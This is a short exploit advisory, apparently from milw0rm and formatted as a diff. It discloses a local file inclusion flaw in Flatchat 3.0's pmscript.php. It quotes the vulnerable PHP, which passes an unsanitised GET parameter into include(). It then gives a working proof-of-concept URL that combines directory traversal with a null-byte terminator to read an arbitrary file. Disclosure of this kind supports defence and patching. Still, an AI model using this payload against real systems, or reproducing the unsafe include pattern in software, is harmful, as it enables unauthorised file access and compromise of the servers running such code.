@@ -1,0 +1,26 @@
+##########################################################################################
+[+] Flatchat 3.0 (pmscript.php with) Local File Inclusion Vulnerability
+[+] Discovered By SirGod
+[+] www.mortal-team.net
+[+] www.h4cky0u.org
+##########################################################################################
+
+[+] Homepage : http://ninjadesigns.co.uk/
+
+[+] Local File Inclusion
+
+  - Vulnerable code in pmscript.php
+
+--------------------------------------------
+$filename = 'users/'.$_GET['with'].'.php';
+
+if (file_exists($filename)) {
+    include($filename);
+--------------------------------------------
+
+
+    http://127.0.0.1/path/pmscript.php?with=../../../../../BOOTSECT.BAK%00
+
+##########################################################################################
+
+# milw0rm.com [2009-04-27]
